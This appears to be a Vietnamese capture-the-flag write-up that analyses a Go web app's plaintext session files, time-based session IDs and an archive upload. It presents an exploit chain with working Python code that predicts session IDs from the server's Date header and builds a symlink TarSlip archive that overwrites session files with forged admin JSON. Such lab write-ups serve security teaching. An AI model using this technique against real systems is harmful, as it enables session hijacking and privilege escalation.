1.4.          Phân tích file services/sessions.go

File sessions.go xử lý tạo, lưu trữ và đọc session:

  • CreateSession:
    • Marshal thông tin user (username, role, v.v.) thành JSON.
    • Tạo thư mục /tmp/sessions/<username>/ nếu chưa tồn tại.
    • Viết file /tmp/sessions/<username>/<sessionID> với nội dung JSON plaintext. → Session được lưu dưới dạng file plaintext (không mã hóa, không sign).
  • PrepareSession:
    • Lưu mapping username → sessionID vào Redis (expire = 0 – không tự động xóa).
  • GetSession:
    • Lấy sessionID từ Redis theo username.
    • Đọc file từ đường dẫn /tmp/sessions/<username>/<sessionID>.
    • Unmarshal JSON thành struct User để kiểm tra quyền.

Ghi chú quan trọng:

  • Session data lưu plaintext và dễ truy cập qua đường dẫn dự đoán được.
  • Redis chỉ dùng để map username → sessionID, không lưu nội dung session → nếu ta overwrite file session bằng JSON giả (role: "admin"), chỉ cần set cookie với sessionID đúng là hijack được session.
  • Thư mục /tmp/sessions/<username>/ có quyền 0755 → dễ bị exploit nếu kết hợp với path traversal từ upload archive.

1.5.          Phân tích file http.go

Chú ý phần UploadEnigma (hàm upload archive):

·  Lấy file từ form "archive".

·  Lưu tạm vào ./uploads/<uuid>.<ext>.

·  Tạo thư mục ./files/<username>/.

·  archiver.Unarchive(tempFile, userFolder) – giải nén trực tiếp mà không kiểm tra path hoặc sanitize. → Điểm nghi ngờ lớn: nếu file archive chứa symlink hoặc path traversal (../ hoặc symlink), có thể ghi file ra ngoài thư mục ./files/<username>/.

 

Kết luận:

·        Ứng dụng dùng Fiber + archiver v3.5.0 để extract archive.

·        Session lưu plaintext file ở đường dẫn dễ đoán.

·        Session ID dễ predict. → Hướng tới lỗ hổng chính: path traversal khi extract archive kết hợp overwrite session file.

2.  Phân tích lỗ hỏng và cơ chế Bypass

2.1.          Lỗ hỏng 1: Path Traversal/TarSlip trong archiver.Unarchive

Trong hàm Upload Engima (http.go):

err = archiver.Unarchive(tempFile, userFolder)

→ File archive được lưu tạm ở ./uploads/., sau đó giải nén trực tiếp vào thư mục ./files//.

→ Không có bất kỳ kiểm tra nào về path bên trong archive (không sanitize, không cấm ../, không kiểm tra symlink).

Thư viện archiver/v3 v3.5.0 (từ go.mod) là phiên bản cũ (2020–2021).

  • Hỗ trợ extract .tar với symlink (loại file SYMTYPE trong tar).
  • Khi extract symlink, hệ thống tạo link trỏ đến target path (có thể nằm ngoài userFolder nếu target dùng ../ hoặc absolute path).

Kết luận từ phân tích:

  • Nếu attacker tạo .tar chứa symlink trỏ đến đường dẫn ngoài userFolder (ví dụ trỏ đến /tmp/sessions/...), thì khi extract, symlink sẽ được tạo.
  • Sau đó, attacker ghi nội dung giả vào symlink → nội dung thực tế ghi vào file target (overwrite file session).

→ Đây là TarSlip (tương tự ZipSlip nhưng với .tar). Lỗ hổng path traversal qua symlink trong archive extraction.

2.2.          Lỗ hỏng 2: Session ID yếu & Session lưu plaintext dễ overwrite

  • Từ sessions.go & http.go:

sessionID := fmt.Sprintf("%x", sha256.Sum256([]byte(strconv.FormatInt(time.Now().Unix(), 10))))

    • Session ID = SHA256(time.Now().Unix() + salt ngầm) → chỉ dùng Unix() (giây), không phải UnixNano. → Chỉ có ~86.400 giá trị mỗi ngày → dễ brute-force nếu biết thời gian gần đúng (thời gian upload).
    • Session lưu plaintext JSON ở /tmp/sessions/<username>/<sessionID>.
    • Redis chỉ map username → sessionID, không lưu nội dung session.

Kết luận từ phân tích:

  • Nếu attacker biết username (dễ đoán hoặc dùng cookie username plaintext), và predict được sessionID (brute ± vài giây), thì biết đường dẫn file session chính xác.
  • Kết hợp với TarSlip → attacker upload .tar chứa symlink trỏ đến đường dẫn session file → overwrite nội dung JSON thành {"role":"admin"}.
  • Sau khi overwrite, set cookie session = sessionID đã predict → hijack session thành admin.

2.3.          Cơ chế Bypass tổng thể (Exploit chain)

Chain exploit:

  1. Đăng ký user bình thường → biết username của mình.
  2. Predict sessionID bằng brute-force timestamp xung quanh thời gian hiện tại.
  3. Tạo .tar chứa symlink trỏ đến /tmp/sessions/<username>/<predicted_session_id> (hoặc session của admin nếu biết username admin).
  4. Trong archive, ghi JSON giả: {"username":"admin","role":"admin","expires":9999999999} vào symlink.
  5. Upload .tar → server extract → symlink tạo → session file bị overwrite.
  6. Set cookie session = predicted_session_id → truy cập /user/admin → lấy flag.

→ Không cần biết password admin, chỉ cần overwrite session file.

3.2.          Phân tích và lấy Server Time + Predict Session ID

def get_session_ids(base_url, username="noexist"):

    print("[+] Trigger fake login để lấy server time...")

    resp = requests.post(f"{base_url}/login", data={"username": username, "password": "dummy"})

    date_header = resp.headers.get("Date")

    if not date_header:

        print("[-] Không có Date header!")

        return None

    print(f"    Server Date: {date_header}")

   

    try:

        parts = date_header.split(", ")[1].split()

        day = int(parts[0])

        mon_str = parts[1]

        year = int(parts[2])

        hms = parts[3]

        mon = MONTHS.index(mon_str) + 1

        h, m, s = map(int, hms.split(":"))

        dt = datetime(year, mon, day, h, m, s, tzinfo=timezone.utc)

        posix = int(dt.timestamp())

       

        sids = [hashlib.sha256(str(posix + d).encode()).hexdigest() for d in [-1, 0, 1]]

        for i, sid in enumerate(sids):

            print(f"    SID {i+1}: {sid}")

        return sids

    except Exception as e:

        print(f"[-] Lỗi parse date: {e}")

        return None

 

Hàm get_session_ids() thực hiện:

  • Gửi một request login giả (username không tồn tại).
  • Lấy header Date từ response → đây là thời gian thực của server.
  • Chuyển Date thành Unix timestamp.
  • Tính SHA-256 cho timestamp ±1 giây → tạo ra 3 candidate sessionID.

Tại sao cần bước này? Vì sessionID được tạo bằng sha256(time.Now().Unix()), nên ta có thể đoán gần đúng.

3.4.          Tạo payload.tar chứa Symlink (ZipSlip)

def create_payload_tar(session_ids, noexist="noexist"):

    print("[+] Tạo payload.tar (ZipSlip symlink)...")

    payload_path = "payload.tar"

    admin_json = json.dumps({"username": noexist, "id": 1337, "role": "admin"}).encode()

   

    with tarfile.open(payload_path, "w") as tar:

        # Symlink tmp_link -> /tmp/sessions

        symlink_info = tarfile.TarInfo("tmp_link")

        symlink_info.type = tarfile.SYMTYPE

        symlink_info.linkname = "/tmp/sessions"

        tar.addfile(symlink_info)

       

        for sid in session_ids:

            arcname = f"tmp_link/{noexist}/{sid}"

            info = tarfile.TarInfo(arcname)

            info.size = len(admin_json)

            tar.addfile(info, io.BytesIO(admin_json))

    print(f"[+] {payload_path} đã tạo xong!")

    return payload_path

Đây là phần quan trọng nhất – hàm create_payload_tar():

  • Tạo một symlink tên tmp_link trỏ đến /tmp/sessions trên server.
  • Viết file JSON giả mạo admin ({"username": "noexist", "id": 1337, "role": "admin"}) vào đường dẫn symlink.
  • Khi server extract .tar, file sẽ được ghi thực sự vào thư mục session.

Kỹ thuật này gọi là Symlink-based ZipSlip – khai thác điểm yếu của thư viện archiver.
